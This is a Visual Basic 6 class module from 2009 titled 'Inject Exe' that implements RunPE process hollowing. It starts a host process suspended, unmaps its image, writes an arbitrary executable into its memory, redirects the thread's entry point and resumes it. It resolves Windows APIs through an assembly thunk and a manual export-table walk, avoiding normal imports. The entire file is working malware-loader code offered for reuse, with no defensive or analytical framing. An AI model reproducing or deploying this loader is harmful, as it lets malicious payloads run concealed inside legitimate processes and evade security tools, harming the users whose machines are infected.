VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "cPEL"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
'---------------------------------------------------------------------------------------
' Module      : cPEL
' DateTime    : 30/06/2009 06:32
' Author      : Cobein
' Mail        : cobein27@hotmail.com
' WebPage     : http://www.advancevb.com.ar (updated =D)
' Purpose     : Inject Exe
' Usage       : At your own risk
' Requirements: None
' Distribution: You can freely use this code in your own
'               applications, but you may not reproduce
'               or publish this code on any web site,
'               online service, or distribute as source
'               on any media without express permission.
'
' Thanks to   : This is gonna be a looong list xD
'               Batfitch - kernel base asm
'               Karcrack - For helping me to debug and test it
'               Paul Caton - vTable patch examples
'               rm_code - First call api prototype
'               and different books and pappers
'
' Compile     : P-Code !!!
'
' Comments    : Coded on top of the invoke module.
'
' History     : 30/06/2009 First Cut....................................................
'---------------------------------------------------------------------------------------
Option Explicit

Private Const IMAGE_DOS_SIGNATURE       As Long = &H5A4D&
Private Const IMAGE_NT_SIGNATURE        As Long = &H4550&

Private Const SIZE_DOS_HEADER           As Long = &H40
Private Const SIZE_NT_HEADERS           As Long = &HF8
Private Const SIZE_EXPORT_DIRECTORY     As Long = &H28
Private Const SIZE_IMAGE_SECTION_HEADER As Long = &H28

Private Const THUNK_KERNELBASE          As String = "8B4C2408B830000000648B008B400C8B401C8B008B4008890131C0C3"
Private Const THUNK_APICALL             As String = "8B4C240851<PATCH1>E8<PATCH2>5989016631C0C3"

Private Const PATCH1                    As String = "<PATCH1>"
Private Const PATCH2                    As String = "<PATCH2>"

Private Const CONTEXT_FULL              As Long = &H10007
Private Const CREATE_SUSPENDED          As Long = &H4
Private Const MEM_COMMIT                As Long = &H1000
Private Const MEM_RESERVE               As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE    As Long = &H40

Private Type STARTUPINFO
    cb                          As Long
    lpReserved                  As Long
    lpDesktop                   As Long
    lpTitle                     As Long
    dwX                         As Long
    dwY                         As Long
    dwXSize                     As Long
    dwYSize                     As Long
    dwXCountChars               As Long
    dwYCountChars               As Long
    dwFillAttribute             As Long
    dwFlags                     As Long
    wShowWindow                 As Integer
    cbReserved2                 As Integer
    lpReserved2                 As Long
    hStdInput                   As Long
    hStdOutput                  As Long
    hStdError                   As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess                    As Long
    hThread                     As Long
    dwProcessID                 As Long
    dwThreadID                  As Long
End Type

Private Type FLOATING_SAVE_AREA
    ControlWord                 As Long
    StatusWord                  As Long
    TagWord                     As Long
    ErrorOffset                 As Long
    ErrorSelector               As Long
    DataOffset                  As Long
    DataSelector                As Long
    RegisterArea(1 To 80)       As Byte
    Cr0NpxState                 As Long
End Type

Private Type CONTEXT
    ContextFlags                As Long
    Dr0                         As Long
    Dr1                         As Long
    Dr2                         As Long
    Dr3                         As Long
    Dr6                         As Long
    Dr7                         As Long
    FloatSave                   As FLOATING_SAVE_AREA
    SegGs                       As Long
    SegFs                       As Long
    SegEs                       As Long
    SegDs                       As Long
    Edi                         As Long
    Esi                         As Long
    Ebx                         As Long
    Edx                         As Long
    Ecx                         As Long
    Eax                         As Long
    Ebp                         As Long
    Eip                         As Long
    SegCs                       As Long
    EFlags                      As Long
    Esp                         As Long
    SegSs                       As Long
End Type

Private Type IMAGE_DOS_HEADER
    e_magic                     As Integer
    e_cblp                      As Integer
    e_cp                        As Integer
    e_crlc                      As Integer
    e_cparhdr                   As Integer
    e_minalloc                  As Integer
    e_maxalloc                  As Integer
    e_ss                        As Integer
    e_sp                        As Integer
    e_csum                      As Integer
    e_ip                        As Integer
    e_cs                        As Integer
    e_lfarlc                    As Integer
    e_ovno                      As Integer
    e_res(0 To 3)               As Integer
    e_oemid                     As Integer
    e_oeminfo                   As Integer
    e_res2(0 To 9)              As Integer
    e_lfanew                    As Long
End Type

Private Type IMAGE_FILE_HEADER
    Machine                     As Integer
    NumberOfSections            As Integer
    TimeDateStamp               As Long
    PointerToSymbolTable        As Long
    NumberOfSymbols             As Long
    SizeOfOptionalHeader        As Integer
    Characteristics             As Integer
End Type

Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress              As Long
    Size                        As Long
End Type

Private Type IMAGE_OPTIONAL_HEADER
    Magic                       As Integer
    MajorLinkerVersion          As Byte
    MinorLinkerVersion          As Byte
    SizeOfCode                  As Long
    SizeOfInitializedData       As Long
    SizeOfUnitializedData       As Long
    AddressOfEntryPoint         As Long
    BaseOfCode                  As Long
    BaseOfData                  As Long
    ImageBase                   As Long
    SectionAlignment            As Long
    FileAlignment               As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion           As Integer
    MinorImageVersion           As Integer
    MajorSubsystemVersion       As Integer
    MinorSubsystemVersion       As Integer
    W32VersionValue             As Long
    SizeOfImage                 As Long
    SizeOfHeaders               As Long
    CheckSum                    As Long
    SubSystem                   As Integer
    DllCharacteristics          As Integer
    SizeOfStackReserve          As Long
    SizeOfStackCommit           As Long
    SizeOfHeapReserve           As Long
    SizeOfHeapCommit            As Long
    LoaderFlags                 As Long
    NumberOfRvaAndSizes         As Long
    DataDirectory(0 To 15)      As IMAGE_DATA_DIRECTORY
End Type

Private Type IMAGE_NT_HEADERS
    Signature                   As Long
    FileHeader                  As IMAGE_FILE_HEADER
    OptionalHeader              As IMAGE_OPTIONAL_HEADER
End Type

Private Type IMAGE_EXPORT_DIRECTORY
   Characteristics              As Long
   TimeDateStamp                As Long
   MajorVersion                 As Integer
   MinorVersion                 As Integer
   lpName                       As Long
   Base                         As Long
   NumberOfFunctions            As Long
   NumberOfNames                As Long
   lpAddressOfFunctions         As Long
   lpAddressOfNames             As Long
   lpAddressOfNameOrdinals      As Long
End Type

Private Type IMAGE_SECTION_HEADER
    SecName                     As String * 8
    VirtualSize                 As Long
    VirtualAddress              As Long
    SizeOfRawData               As Long
    PointerToRawData            As Long
    PointerToRelocations        As Long
    PointerToLinenumbers        As Long
    NumberOfRelocations         As Integer
    NumberOfLinenumbers         As Integer
    Characteristics             As Long
End Type

Private Declare Sub CpyMem Lib "kernel32" Alias "RtlMoveMemory" (pDst As Any, pSrc As Any, ByVal dlen As Long)

Private c_lKrnl         As Long
Private c_lLoadLib      As Long
Private c_bInit         As Boolean
Private c_lVTE          As Long
Private c_lOldVTE       As Long
Private c_bvASM(&HFF)   As Byte
        
Public Function zDoNotCall() As Long
    'This function will be replaced with machine code laterz
    'Do not add any public procedure on top of it
End Function

Public Function RunPE(ByRef bvBuff() As Byte, Optional sHost As String) As Boolean
    Dim i                       As Long
    Dim tIMAGE_DOS_HEADER       As IMAGE_DOS_HEADER
    Dim tIMAGE_NT_HEADERS       As IMAGE_NT_HEADERS
    Dim tIMAGE_SECTION_HEADER   As IMAGE_SECTION_HEADER
    Dim tSTARTUPINFO            As STARTUPINFO
    Dim tPROCESS_INFORMATION    As PROCESS_INFORMATION
    Dim tCONTEXT                As CONTEXT
    Dim lKernel                 As Long
    Dim lNTDll                  As Long
    Dim lMod                    As Long
    
    If Not c_bInit Then Exit Function

    Call CpyMem(tIMAGE_DOS_HEADER, bvBuff(0), SIZE_DOS_HEADER)
    
    If Not tIMAGE_DOS_HEADER.e_magic = IMAGE_DOS_SIGNATURE Then
        Exit Function
    End If

    Call CpyMem(tIMAGE_NT_HEADERS, bvBuff(tIMAGE_DOS_HEADER.e_lfanew), SIZE_NT_HEADERS)
    
    If Not tIMAGE_NT_HEADERS.Signature = IMAGE_NT_SIGNATURE Then
        Exit Function
    End If
    
    lKernel = LoadLibrary("kernel32")
    lNTDll = LoadLibrary("ntdll")
    
    If sHost = vbNullString Then
        sHost = Space(260)
        lMod = GetProcAddress(lKernel, "GetModuleFileNameW")
        Invoke lMod, App.hInstance, StrPtr(sHost), 260
    End If
    
    With tIMAGE_NT_HEADERS.OptionalHeader
        
        tSTARTUPINFO.cb = Len(tSTARTUPINFO)
            
        lMod = GetProcAddress(lKernel, "CreateProcessW")
        Invoke lMod, 0, StrPtr(sHost), 0, 0, 0, CREATE_SUSPENDED, 0, 0, VarPtr(tSTARTUPINFO), VarPtr(tPROCESS_INFORMATION)

        lMod = GetProcAddress(lNTDll, "NtUnmapViewOfSection")
        Invoke lMod, tPROCESS_INFORMATION.hProcess, .ImageBase
        
        lMod = GetProcAddress(lKernel, "VirtualAllocEx")
        Invoke lMod, tPROCESS_INFORMATION.hProcess, .ImageBase, .SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE
        
        lMod = GetProcAddress(lKernel, "WriteProcessMemory")
        Invoke lMod, tPROCESS_INFORMATION.hProcess, .ImageBase, VarPtr(bvBuff(0)), .SizeOfHeaders, 0
    
        For i = 0 To tIMAGE_NT_HEADERS.FileHeader.NumberOfSections - 1
            CpyMem tIMAGE_SECTION_HEADER, bvBuff(tIMAGE_DOS_HEADER.e_lfanew + SIZE_NT_HEADERS + SIZE_IMAGE_SECTION_HEADER * i), Len(tIMAGE_SECTION_HEADER)
            Invoke lMod, tPROCESS_INFORMATION.hProcess, .ImageBase + tIMAGE_SECTION_HEADER.VirtualAddress, VarPtr(bvBuff(tIMAGE_SECTION_HEADER.PointerToRawData)), tIMAGE_SECTION_HEADER.SizeOfRawData, 0
        Next i

        tCONTEXT.ContextFlags = CONTEXT_FULL
        
        lMod = GetProcAddress(lNTDll, "NtGetContextThread")
        Invoke lMod, tPROCESS_INFORMATION.hThread, VarPtr(tCONTEXT)
    
        lMod = GetProcAddress(lKernel, "WriteProcessMemory")
        Invoke lMod, tPROCESS_INFORMATION.hProcess, tCONTEXT.Ebx + 8, VarPtr(.ImageBase), 4, 0
       
        tCONTEXT.Eax = .ImageBase + .AddressOfEntryPoint
        
        lMod = GetProcAddress(lNTDll, "NtSetContextThread")
        Invoke lMod, tPROCESS_INFORMATION.hThread, VarPtr(tCONTEXT)
        
        lMod = GetProcAddress(lNTDll, "NtResumeThread")
        Invoke lMod, tPROCESS_INFORMATION.hThread, 0
    End With
    
    RunPE = True
    
End Function

Public Function Invoke(ByVal lMod As Long, ParamArray Params()) As Long
    Dim lPtr        As Long
    Dim i           As Long
    Dim sData       As String
    Dim sParams     As String
    If lMod = 0 Then Exit Function
    For i = UBound(Params) To 0 Step -1
        sParams = sParams & "68" & GetLong(CLng(Params(i)))
    Next
    lPtr = VarPtr(c_bvASM(0))
    lPtr = lPtr + (UBound(Params) + 2) * 5
    lPtr = lMod - lPtr - 5
    sData = THUNK_APICALL
    sData = Replace(sData, PATCH1, sParams)
    sData = Replace(sData, PATCH2, GetLong(lPtr))
    Call PutThunk(sData)
    Invoke = PatchCall
End Function

Private Function GetLong(ByVal lData As Long) As String
    Dim bvTemp(3)   As Byte
    Dim i           As Long
    
    CpyMem bvTemp(0), lData, &H4
    For i = 0 To 3
        GetLong = GetLong & Right("0" & Hex(bvTemp(i)), 2)
    Next
End Function

Private Sub PutThunk(ByVal sThunk As String)
    Dim i   As Long
    For i = 0 To Len(sThunk) - 1 Step 2
        c_bvASM((i / 2)) = CByte("&h" & Mid$(sThunk, i + 1, 2))
    Next
End Sub

Private Function PatchCall() As Long
    CpyMem c_lVTE, ByVal ObjPtr(Me), &H4
    c_lVTE = c_lVTE + &H1C
    CpyMem c_lOldVTE, ByVal c_lVTE, &H4
    CpyMem ByVal c_lVTE, VarPtr(c_bvASM(0)), &H4
    PatchCall = zDoNotCall
    CpyMem ByVal c_lVTE, c_lOldVTE, &H4
End Function

Public Function GetMod(ByVal sLib As String, ByVal sProc As String) As Long
    GetMod = Me.GetProcAddress(Me.LoadLibrary(sLib), sProc)
End Function

Public Function LoadLibrary(ByVal sLib As String) As Long
    LoadLibrary = Invoke(c_lLoadLib, StrPtr(sLib & vbNullChar))
End Function

Public Property Get Initialized() As Boolean
    Initialized = c_bInit
End Property

Private Sub Class_Initialize()
    Call PutThunk(THUNK_KERNELBASE)
    c_lKrnl = PatchCall
    
    If Not c_lKrnl = 0 Then
        c_lLoadLib = GetProcAddress(c_lKrnl, "LoadLibraryW")
        If Not c_lLoadLib = 0 Then
            c_bInit = True
        End If
    End If
End Sub

Public Function GetProcAddress(ByVal lMod As Long, ByVal sProc As String) As Long
    Dim tIMAGE_DOS_HEADER       As IMAGE_DOS_HEADER
    Dim tIMAGE_NT_HEADERS       As IMAGE_NT_HEADERS
    Dim tIMAGE_EXPORT_DIRECTORY As IMAGE_EXPORT_DIRECTORY
    
    Call CpyMem(tIMAGE_DOS_HEADER, ByVal lMod, SIZE_DOS_HEADER)
    
    If Not tIMAGE_DOS_HEADER.e_magic = IMAGE_DOS_SIGNATURE Then
        Exit Function
    End If

    Call CpyMem(tIMAGE_NT_HEADERS, ByVal lMod + tIMAGE_DOS_HEADER.e_lfanew, SIZE_NT_HEADERS)
    
    If Not tIMAGE_NT_HEADERS.Signature = IMAGE_NT_SIGNATURE Then
        Exit Function
    End If
    
    Dim lVAddress   As Long
    Dim lVSize      As Long
    Dim lBase       As Long
    
    With tIMAGE_NT_HEADERS.OptionalHeader
        lVAddress = lMod + .DataDirectory(0).VirtualAddress
        lVSize = lVAddress + .DataDirectory(0).Size
        lBase = .ImageBase
    End With
    
    Call CpyMem(tIMAGE_EXPORT_DIRECTORY, ByVal lVAddress, SIZE_EXPORT_DIRECTORY)
       
    Dim i           As Long
    Dim lFunctAdd   As Long
    Dim lNameAdd    As Long
    Dim lNumbAdd    As Long

    With tIMAGE_EXPORT_DIRECTORY
        For i = 0 To .NumberOfNames - 1
           
            CpyMem lNameAdd, ByVal lBase + .lpAddressOfNames + i * 4, 4
            
            If StringFromPtr(lBase + lNameAdd) = sProc Then
                CpyMem lNumbAdd, ByVal lBase + .lpAddressOfNameOrdinals + i * 2, 2
                CpyMem lFunctAdd, ByVal lBase + .lpAddressOfFunctions + lNumbAdd * 4, 4
                
                GetProcAddress = lFunctAdd + lBase
                             
                If GetProcAddress >= lVAddress And _
                   GetProcAddress <= lVSize Then
                    Call ResolveForward(GetProcAddress, lMod, sProc)
                    If Not lMod = 0 Then
                        GetProcAddress = GetProcAddress(lMod, sProc)
                    Else
                        GetProcAddress = 0
                    End If
                End If
                
                Exit Function
            End If
        Next
    End With
End Function

Private Function ResolveForward(ByVal lAddress As Long, ByRef lLib As Long, ByRef sMod As String)
    Dim sForward     As String

    sForward = StringFromPtr(lAddress)
    If InStr(1, sForward, ".") Then
        lLib = LoadLibrary(Split(sForward, ".")(0))
        sMod = Split(sForward, ".")(1)
    End If
End Function

Private Function StringFromPtr(ByVal lAddress As Long) As String
    Dim bChar       As Byte
    
    Do
        CpyMem bChar, ByVal lAddress, 1
        lAddress = lAddress + 1
        If bChar = 0 Then Exit Do
        StringFromPtr = StringFromPtr & Chr$(bChar)
    Loop
End Function
